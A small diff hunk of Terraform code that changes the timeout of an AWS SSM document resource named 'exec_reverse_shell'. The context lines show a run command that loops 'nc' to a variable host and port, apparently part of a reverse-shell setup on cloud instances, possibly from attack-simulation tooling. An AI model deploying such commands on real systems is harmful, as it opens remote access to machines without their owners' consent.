@@ -22,7 +22,7 @@ resource "aws_ssm_document" "exec_reverse_shell" {
                     ]
                 },
                 "inputs": {
-                    "timeoutSeconds": "60",
+                    "timeoutSeconds": "600",
                     "runCommand": [
                         "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
                         "while ! nc -w 1 ${local.host_ip} ${local.host_post}; do sleep 5; done",
